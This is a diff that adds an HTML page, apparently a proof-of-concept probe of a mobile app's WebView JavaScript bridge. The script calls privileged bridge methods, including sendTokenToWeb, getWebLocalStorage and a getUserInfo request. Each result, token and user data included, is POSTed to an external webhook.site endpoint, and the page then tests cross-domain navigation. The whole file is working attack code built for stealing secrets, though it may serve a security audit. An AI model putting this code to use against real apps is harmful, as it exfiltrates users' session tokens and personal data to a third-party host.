@@ -1,0 +1,29 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>BGF</title></head>
+<body style="font:12px monospace;white-space:pre-wrap;color:#000;background:#fff">
+<div id="o">boot</div>
+<script>
+var L=[],t0=Date.now();
+function T(){return "+"+((Date.now()-t0)/1000).toFixed(1)+"s";}
+function log(s){L.push(T()+" "+s);document.getElementById('o').textContent=L.join("\n");
+ try{fetch("https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217",{method:"POST",mode:"no-cors",body:T()+" "+s});}catch(e){}}
+log("URL="+location.href);
+var seen={};
+function mk(a){var f="cb_"+a;window[f]=function(d){seen[a]=1;log("CALLBACK "+a+" -> "+String(typeof d=="string"?d:JSON.stringify(d)).slice(0,220));};return f;}
+setTimeout(function(){
+  log("BRIDGE="+(!!window.control)+" METHOD_COUNT="+(window.control?Object.keys(control).length:0));
+  if(!window.control){log("NO BRIDGE");return;}
+  var T2=[["saveImageToAlbum",mk("saveImageToAlbum")],["sendTokenToWeb",mk("sendTokenToWeb")],
+          ["getWebLocalStorage",JSON.stringify({key:"k",callbackFun:mk("getWebLocalStorage")})],
+          ["getInviteFriends",mk("getInviteFriends")],["getAppUsdtRateData",mk("getAppUsdtRateData")],
+          ["getNavigationBarHide",mk("getNavigationBarHide")],
+          ["requestAction",JSON.stringify({path:"/v1/social/userInfo/getUserInfo",params:{},requestId:mk("requestAction")})]];
+  T2.forEach(function(p){try{if(typeof control[p[0]]==="function"){control[p[0]](p[1]);log("CALL "+p[0]);}else{log("MISSING "+p[0]);}}catch(e){log("THROW "+p[0]+" "+e);}});
+  setTimeout(function(){
+    log("--- PERMISSION VERDICT (callback received == call executed) ---");
+    ["saveImageToAlbum","sendTokenToWeb","getWebLocalStorage","getInviteFriends","getAppUsdtRateData","getNavigationBarHide","requestAction"]
+      .forEach(function(a){log((seen[a]?"EXECUTED ":"BLOCKED  ")+a);});
+    log("--- END VERDICT ---");
+  },8000);
+},1200);
+setTimeout(function(){log("NAV cross-domain -> https://example.org/ (WebView must stay internal if not re-checked)");location.href="https://example.org/?recheck=absent";},22000);
+</script></body></html>
